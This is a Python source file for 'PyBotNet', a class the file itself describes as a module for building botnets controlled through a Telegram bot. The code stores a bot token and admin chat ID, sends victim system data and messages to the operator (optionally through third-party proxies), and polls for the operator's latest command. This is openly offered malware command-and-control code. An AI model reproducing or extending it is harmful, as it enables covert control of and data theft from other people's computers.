# import built-in & third-party modules
import logging

# import pybotnet modules
import util


class PyBotNet:
    '''
    A module for building botnets with Python and Telegram control panel\n
    '''

    def __init__(
        self,
        TELEGRAM_TOKEN,
        ADMIN_CHAT_ID,
        show_log=False,
        send_system_data=True
    ):

        self.TELEGRAM_TOKEN = TELEGRAM_TOKEN
        self.ADMIN_CHAT_ID = ADMIN_CHAT_ID
        self.show_log = show_log  # show logs
        self.send_system_data = send_system_data  # send system info in message

        # logging:
        if self.show_log:
            # show all log's
            self.log_level = logging.INFO
        else:
            # off all log's
            self.log_level = 100
        self.my_logger = logging
        self.my_logger.basicConfig(level=self.log_level)
        self.logger = self.my_logger.getLogger('PyBotNet')

    def send_message_by_third_party_proxy(self, message):
        '''Send messages by api url and third party proxy to adimn'''

        self.api_url = util.make_send_message_api_url(self.TELEGRAM_TOKEN,
                                                      self.ADMIN_CHAT_ID, message)

        return util.post_data_by_third_party_proxy(self.api_url, self.logger)

    def send_message(self, message):
        '''Send messages by api url to adimn'''

        self.api_url = util.make_send_message_api_url(self.TELEGRAM_TOKEN,
                                                      self.ADMIN_CHAT_ID, message)

        return util.post_data(self.api_url, self.logger)

    def get_last_command_by_third_party_proxy(self):
        messages_list = (util.get_update_by_third_party_proxy(
            self.TELEGRAM_TOKEN, self.logger))

        if messages_list:
            last_message = util.extract_last_admin_command(
                messages_list, self.ADMIN_CHAT_ID, self.logger)

            if last_message:
                return last_message

        return False
